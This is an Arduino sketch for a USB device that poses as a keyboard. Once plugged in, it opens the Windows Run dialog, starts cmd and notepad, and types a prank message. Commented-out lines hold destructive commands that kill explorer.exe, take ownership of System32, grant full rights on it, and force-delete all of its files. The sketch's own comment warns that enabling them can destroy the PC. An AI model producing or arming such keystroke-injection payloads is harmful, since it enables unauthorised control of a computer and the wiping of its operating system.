#include "Keyboard.h"

void typing(const char* text, int delayMs = 50) {
  for (int i = 0; i < strlen(text); i++) {
    Keyboard.print(text[i]);
    delay(delayMs);
  }
  Keyboard.println();
}

void setup() {
  Keyboard.begin();
  delay(5000);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  
  Keyboard.println("cmd /c start /min cmd /c \"\"");
  delay(1000);

  Keyboard.println("start /min notepad");
  delay(1500);

  typing("hi from robot.", 60);
  delay(500);
  typing("its pretty cozy inside your computer.", 70);
  delay(500);
  
  // Uncommenting any of those strings can destroy your PC
  //Keyboard.println("taskkill /f /im explorer.exe");
  //Keyboard.println("takeown /f C:\Windows\System32 /r /d y");
  //Keyboard.println("icacls C:\Windows\System32 /t /c /grant Administrators:F");
  //Keyboard.println("del /f /s /q \"C:\\Windows\\System32\\*.*\"");
  delay(1000);
  
  Keyboard.println("exit");
  delay(500);
  
  Keyboard.end();
}

void loop() {
}
